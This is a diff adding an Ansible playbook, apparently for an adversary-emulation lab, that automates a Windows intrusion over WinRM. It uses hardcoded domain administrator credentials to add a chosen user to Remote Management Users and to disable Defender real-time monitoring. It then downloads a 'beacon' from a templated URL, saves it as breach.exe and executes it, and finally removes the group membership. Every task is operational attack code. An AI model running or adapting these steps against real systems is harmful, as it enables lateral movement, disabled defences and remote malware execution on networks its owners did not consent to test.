@@ -1,0 +1,64 @@
+---
+- name: Setting random user/worksattion
+  set_fact:
+    rand_user: '{{ pick_user }}'
+    rand_workstation: '{{ pick_workstation }}'
+
+- name: User
+  debug:
+    var: rand_user
+
+- name: Workstation
+  debug:
+    var: rand_workstation
+
+- name: Add {{ rand_user }} to Remote Management Users on {{ rand_workstation }}
+  ansible.windows.win_powershell:
+    script: |      
+          $password = ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force
+          $creds = New-Object System.Management.Automation.PSCredential ("{{ Domain }}\administrator", $password)
+          $sess = New-PSSession -ComputerName {{ rand_workstation }} -credential $creds
+          Invoke-Command -Session $sess -ScriptBlock { net localgroup "Remote Management Users" {{ rand_user }} /add}
+
+### Defender
+- name: Disabling Defender on {{ rand_workstation }}
+  ansible.windows.win_powershell:
+    script: |      
+          $password = ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force
+          $creds = New-Object System.Management.Automation.PSCredential ("{{ Domain }}\administrator", $password)
+          $sess = New-PSSession -ComputerName {{ rand_workstation }} -credential $creds
+          Invoke-Command -Session $sess -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true }
+  when: defender == false
+
+### EXE
+- name: Powershell - WinRM to {{ rand_workstation }}, download and execute {{ beacon_url }} - EXE
+  ansible.windows.win_powershell:
+    script: |      
+          $password = ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force
+          $creds = New-Object System.Management.Automation.PSCredential ("{{ Domain }}\{{ rand_user }}", $password)
+          $sess = New-PSSession -ComputerName {{ rand_workstation }} -credential $creds
+          Invoke-Command -Session $sess -ScriptBlock { wget {{ beacon_url }} -o C:/Users/{{ rand_user}}/Documents/breach.exe }
+          Invoke-Command -Session $sess -ScriptBlock { powershell.exe -NonInteractive -NoProfile C:/Users/{{ rand_user}}/Documents/breach.exe }
+  async: 10
+  poll: 0
+  when: beacon_type == "EXE"
+
+### PS1
+- name: Powershell - WinRM to {{ rand_workstation }}, download and execute {{ beacon_url }} - PS1
+  ansible.windows.win_powershell:
+    script: |      
+          $password = ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force
+          $creds = New-Object System.Management.Automation.PSCredential ("{{ Domain }}\{{ rand_user }}", $password)
+          $sess = New-PSSession -ComputerName {{ rand_workstation }} -credential $creds
+          Invoke-Command -Session $sess -ScriptBlock { whoami > C:/Users/{{ rand_user}}/Documents/here.txt }
+  async: 10
+  poll: 0
+  when: beacon_type == "PS1"
+
+- name: Delete {{ rand_user }} from Remote Management Users on {{ rand_workstation }}
+  ansible.windows.win_powershell:
+    script: |      
+          $password = ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force
+          $creds = New-Object System.Management.Automation.PSCredential ("{{ Domain }}\administrator", $password)
+          $sess = New-PSSession -ComputerName {{ rand_workstation }} -credential $creds
+          Invoke-Command -Session $sess -ScriptBlock { net localgroup "Remote Management Users" {{ rand_user }} /del}
